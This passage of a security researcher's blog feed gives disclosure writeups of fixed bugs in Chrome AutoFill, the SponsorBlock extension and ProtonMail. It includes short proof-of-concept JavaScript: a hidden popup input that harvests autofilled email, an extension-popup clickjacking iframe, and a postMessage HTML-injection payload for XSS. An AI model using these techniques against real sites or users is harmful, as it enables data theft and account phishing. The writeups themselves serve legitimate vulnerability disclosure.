<content type="html" xml:base="https://ndevtk.github.io/writeups/2022/06/05/autofill/"><p>AutoFill is not be meant to be usable via keyboard shortcuts when its hidden.<br /> But with a certain window size it would attempt to render over the url bar.</p> <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">let</span> <span class="nx">w</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">""</span><span class="p">,</span> <span class="dl">""</span><span class="p">,</span> <span class="dl">"</span><span class="s2">width=1,height=1</span><span class="dl">"</span><span class="p">);</span> <span class="nx">w</span><span class="p">.</span><span class="nx">resizeTo</span><span class="p">(</span><span class="mi">250</span><span class="p">,</span><span class="mi">150</span><span class="p">);</span> <span class="nx">w</span><span class="p">.</span><span class="nb">eval</span><span class="p">(</span><span class="s2">` let input = document.createElement("input"); input.type = "email"; input.autocomplete = "email"; input.name = "email"; input.size = "1"; input.style.opacity = '0'; input.onkeypress = e =&gt; { e.preventDefault(); } window.onmousedown = e =&gt; { // ignore mouse clicks e.preventDefault(); } input.onchange = e =&gt; { alert(e.srcElement.value); e.srcElement.value = ""; } document.body.appendChild(input); setInterval(() =&gt; { input.focus({preventScroll: true}); }, 1000); `</span><span class="p">);</span> <span class="kd">let</span> <span class="nx">p</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="dl">'</span><span class="s1">p</span><span class="dl">'</span><span class="p">);</span> <span class="nx">p</span><span class="p">.</span><span class="nx">innerText</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">Please press the Up arrow then Enter :)</span><span class="dl">'</span><span class="p">;</span> <span class="nx">w</span><span class="p">.</span><span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">p</span><span class="p">)</span> </code></pre></div></div></content>
<author>
<name/>
</author>
<summary type="html">AutoFill is not be meant to be usable via keyboard shortcuts when its hidden. But with a certain window size it would attempt to render over the url bar.</summary>
</entry>
<entry>
<title type="html">SponsorBlock</title>
<link href="https://ndevtk.github.io/writeups/2022/06/05/sponsorblock/" rel="alternate" type="text/html" title="SponsorBlock"/>
<published>2022-06-05T00:00:00+00:00</published>
<updated>2022-06-05T00:00:00+00:00</updated>
<id>https://ndevtk.github.io/writeups/2022/06/05/sponsorblock</id>
<content type="html" xml:base="https://ndevtk.github.io/writeups/2022/06/05/sponsorblock/"><p><a href="https://sponsor.ajay.app/">SponsorBlock</a> is a browser extension to skip YouTube sponsors using crowd sourced data.<br /> Was forked from <a href="https://github.com/NDevTK/YTSponsorSkip">my extension</a> despite what it says that was not in 2020.<br /> Since its crowd sourced it has to trust its users but to prevent abuse VIPs can lock segments.</p> <h1 id="clickjacking-2022">Clickjacking (2022)</h1> <p>Because they wanted to insert the extension popup on to the YouTube page popup.html was added to web_accessible_resources,<br /> The ability to use a iframe was unknown there was no embedding protection and it used a hacky <code class="language-plaintext highlighter-rouge">sendRequestToCustomServer</code> function to inject the content into the page dom. <br /> This meant the persons user id was exposed to YouTube and the popup controls such as the ability to turn off sponsor skipping could be clickjacked.</p> <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">let</span> <span class="nx">frame</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="dl">'</span><span class="s1">iframe</span><span class="dl">'</span><span class="p">);</span> <span class="nx">frame</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">chrome-extension://mnjggcdmjocbbbhaepdhchncahnbgone/popup.html</span><span class="dl">'</span><span class="p">;</span> <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">frame</span><span class="p">)</span> </code></pre></div></div> <p>This was fixed by just using the iframe and checking the origin of the parent with postMessage for <code class="language-plaintext highlighter-rouge">*.youtube.com</code><br /> On Firefox this attack is harder because it uses a randomized id for the url this also prevents detecting the existence of extensions.</p> <h1 id="javascript-allowed-on-the-api-2021">Javascript allowed on the API (2021)</h1> <p>Fixed by adding a CSP. <a href="https://w3c.github.io/webappsec-post-spectre-webdev/">Post-Spectre Web Development</a></p> <h1 id="trusting-3rd-party-2021">Trusting 3rd party (2021)</h1> <p>The servers nginx.conf had a proxy_pass for a 3rd party service.<br /> That would allow impersonation of the sponsor.ajay.app domain.</p> <h1 id="unlisted-video-ids-exposed-to-the-sponsorblock-server-2020">Unlisted video IDs exposed to the SponsorBlock server (2020)</h1> <p>Fixed by checking if a video was unlisted and then asking the user, later changed to a k-anonymity system.</p> <h1 id="insecure-user-id-generation-2019">Insecure user id generation (2019)</h1> <p>The extension uses a random id to authenticate users that is then hashed when stored in the public database.<br /> But it used the insecure <code class="language-plaintext highlighter-rouge">Math.random()</code> it now uses <code class="language-plaintext highlighter-rouge">window.crypto.getRandomValues</code></p> <h1 id="rate-limit-bypass-2019">Rate limit bypass (2019)</h1> <p>Since the server was using caddy it was possible to spoof your IP address with the x-forwarded-for header.</p> <h1 id="users-ips-exposed-in-public-database-2019">Users IPs exposed in public database (2019)</h1> <p>While IPv4 addresses where hashed 5000 times its using sha256 with a static salt so it would be easy to compute all possible IP addresses.<br /> This was fixed by moving the data to a private database.</p></content>
<author>
<name/>
</author>
<summary type="html">SponsorBlock is a browser extension to skip YouTube sponsors using crowd sourced data. Was forked from my extension despite what it says that was not in 2020. Since its crowd sourced it has to trust its users but to prevent abuse VIPs can lock segments.</summary>
</entry>
<entry>
<title type="html">Proton</title>
<link href="https://ndevtk.github.io/writeups/2022/06/03/proton/" rel="alternate" type="text/html" title="Proton"/>
<published>2022-06-03T00:00:00+00:00</published>
<updated>2022-06-03T00:00:00+00:00</updated>
<id>https://ndevtk.github.io/writeups/2022/06/03/proton</id>
<content type="html" xml:base="https://ndevtk.github.io/writeups/2022/06/03/proton/"><h1 id="xss-on-httpsaccount-apiprotonmailcom-challengev4html">XSS on https://account-api.protonmail.com (/challenge/v4/html)</h1> <p>While being a “sandbox” domain its same-site and is used for UI elements on the login page so would be good for phishing :)</p> <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">window</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="dl">"</span><span class="s2">message</span><span class="dl">"</span><span class="p">,</span> <span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span> <span class="k">if</span> <span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">source</span> <span class="o">===</span> <span class="nb">window</span><span class="p">.</span><span class="nx">parent</span><span class="p">)</span> <span class="p">{</span> <span class="kd">var</span> <span class="nx">t</span> <span class="o">=</span> <span class="nx">e</span><span class="p">.</span><span class="nx">data</span><span class="p">,</span> <span class="nx">n</span> <span class="o">=</span> <span class="nx">t</span> <span class="o">&amp;&amp;</span> <span class="nx">t</span><span class="p">.</span><span class="nx">type</span><span class="p">,</span> <span class="nx">i</span> <span class="o">=</span> <span class="nx">t</span> <span class="o">&amp;&amp;</span> <span class="nx">t</span><span class="p">.</span><span class="nx">payload</span><span class="p">;</span> <span class="k">if</span> <span class="p">(</span><span class="nx">t</span> <span class="o">&amp;&amp;</span> <span class="nx">n</span> <span class="o">&amp;&amp;</span> <span class="nx">i</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="dl">"</span><span class="s2">load</span><span class="dl">"</span> <span class="o">===</span> <span class="nx">n</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="dl">"</span><span class="s2">#styles-root</span><span class="dl">"</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">i</span><span class="p">.</span><span class="nx">stylesRoot</span> <span class="o">||</span> <span class="dl">""</span><span class="p">,</span> <span class="nb">document</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="dl">"</span><span class="s2">#icons-root</span><span class="dl">"</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">i</span><span class="p">.</span><span class="nx">iconsRoot</span> <span class="o">||</span> <span class="dl">""</span><span class="p">,</span> </code></pre></div></div> <p>Because of the window.parent an iframe has to be used to get the XSS but that was possible since it had no embedding protection, now fixed with CSP <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors">frame-ancestors</a>.</p> <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">frame</span><span class="p">.</span><span class="nx">contentWindow</span><span class="p">.</span><span class="nx">postMessage</span><span class="p">({</span><span class="na">type</span><span class="p">:</span> <span class="dl">'</span><span class="s1">load</span><span class="dl">'</span><span class="p">,</span> <span class="na">payload</span><span class="p">:</span> <span class="p">{</span><span class="na">iconsRoot</span><span class="p">:</span> <span class="dl">'</span><span class="s1">&lt;img src="https://http.cat/200"&gt;</span><span class="dl">'</span><span class="p">}},</span> <span class="dl">'</span><span class="s1">*</span><span class="dl">'</span><span class="p">);</span> </code></pre></div></div> <h1 id="xss-on-httpssecureprotonmailcom">XSS on https://secure.protonmail.com</h1> <p>The message listener had a same-site check but accepted any origin that contained <code class="language-plaintext highlighter-rouge">protonmail</code>.</p> <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nx">Pn</span><span class="p">(</span><span class="nx">t</span><span class="p">)</span> <span class="p">{</span> <span class="nx">t</span> <span class="o">=</span> <span class="mi">0</span> <span class="o">&lt;</span> <span class="nx">arguments</span><span class="p">.</span><span class="nx">length</span> <span class="o">&amp;&amp;</span> <span class="k">void</span> <span class="mi">0</span> <span class="o">!==</span> <span class="nx">t</span> <span class="p">?</span> <span class="nx">t</span> <span class="p">:</span> <span class="dl">""</span><span class="p">;</span> <span class="k">return</span> <span class="sr">/localhost:</span><span class="se">\d{4}</span><span class="sr">$/</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">t</span><span class="p">)</span> <span class="o">||</span> <span class="sr">/protonmail/</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">t</span><span class="p">)</span> <span class="p">}</span> </code></pre></div></div> <p>Not possible on the proton.me domain.</p> <h1 id="leaking-email-contents-xs-search">Leaking email contents (XS-Search)</h1> <p>An android icon was cached based on the result of a search and the application does not use the Cross-Origin-Opener-Policy or have a Vary Sec-Fetch-Site header.<br /> This allowed for a <a href="https://xsleaks.dev/docs/attacks/xs-search/">XS-Search</a> attack and was eventually fixed by removing the image. <br /> Cache partitioning does not prevent this because of the same-site XSS and because the asset is same-site as the application so the <a href="https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass">partitioned cache bypass</a> applies. <br /> “Search message content” is opt-in per https://proton.me/support/search so it may be limited to the email subject for some users, such attack would also need an idle user or a popunder/tabunder to not be suspicious due to the top-level navigations.</p></content>
<author>
<name/>
</author>
<summary type="html">XSS on https://account-api.protonmail.com (/challenge/v4/html) While being a “sandbox” domain its same-site and is used for UI elements on the login page so would be good for phishing :) window.addEventListener("message", (function(e) { if (e.source === window.parent) { var t = e.data, n = t &amp;&amp; t.type, i = t &amp;&amp; t.payload; if (t &amp;&amp; n &amp;&amp; i &amp;&amp; ("load" === n &amp;&amp; (document.querySelector("#styles-root").innerHTML = i.stylesRoot || "", document.querySelector("#icons-root").innerHTML = i.iconsRoot || "",</summary>
</entry>
</feed>
